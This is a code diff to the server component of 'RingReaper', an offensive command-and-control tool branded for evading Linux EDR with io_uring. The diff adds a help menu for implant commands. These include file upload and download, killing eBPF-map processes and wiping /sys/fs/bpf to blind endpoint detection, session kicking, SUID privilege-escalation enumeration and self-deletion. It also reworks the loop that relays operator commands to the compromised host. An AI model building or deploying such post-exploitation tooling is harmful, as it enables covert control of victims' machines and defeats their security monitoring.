@@ -12,11 +12,28 @@ BANNER = r"""
 ██╔══██╗██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
 ██║  ██║██║██║ ╚████║╚██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
 ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
-                                                                             
+                                                                              
 
    	          --- EVADING LINUX EDRS WITH IO_URING ---
 
 """
+
+def help():
+    return '''
+Available commands:
+  get <path>                   - See file
+  put <local_path> <remote_path> - Upload file
+  killbpf                     - Kill processes that have bpf-map and delete /sys/fs/bpf/*
+  users                       - View logged users
+  ss/netstat                  - View connections
+  ps                          - List processes
+  me                          - Show agent PID and TTY
+  kick <pts>                  - Kill session by pts
+  privesc                     - Enumerate SUID binaries
+  selfdestruct                - Delete agent and exit
+  exit                        - Close connection (without deleting the agent)
+  help                        - This help
+'''
 
 def main():
     parser = argparse.ArgumentParser(description="RingReaper server")
@@ -47,8 +64,11 @@ def main():
                     cmd = input("root@nsa:~#  ").strip()
                     if not cmd:
                         continue
+                        
+                    if cmd.startswith("help"):
+                         print(help())
 
-                    if cmd.startswith("put "):
+                    elif cmd.startswith("put "):
                         parts = cmd.split()
                         if len(parts) != 3:
                             print("[!] Usage: put <local_path> <remote_path>")
@@ -75,21 +95,22 @@ def main():
                         except Exception as e:
                             print(f"[!] Failed to open local file: {e}")
                         continue
+                        
+                    else:
+                        conn.sendall(cmd.encode() + b"\n")
 
-                    conn.sendall(cmd.encode() + b"\n")
+                        data = b""
+                        while True:
+                            chunk = conn.recv(4096)
+                            if not chunk:
+                                print("[!] Connection closed by client")
+                                return
+                            data += chunk
+                            if len(chunk) < 4096:
+                                break
 
-                    data = b""
-                    while True:
-                        chunk = conn.recv(4096)
-                        if not chunk:
-                            print("[!] Connection closed by client")
-                            return
-                        data += chunk
-                        if len(chunk) < 4096:
-                            break
-
-                    print("[+] Output:\n")
-                    print(data.decode(errors="ignore"))
+                        print("[+] Output:\n")
+                        print(data.decode(errors="ignore"))
 
             except KeyboardInterrupt:
                 print("\n[-] Server shutting down.")
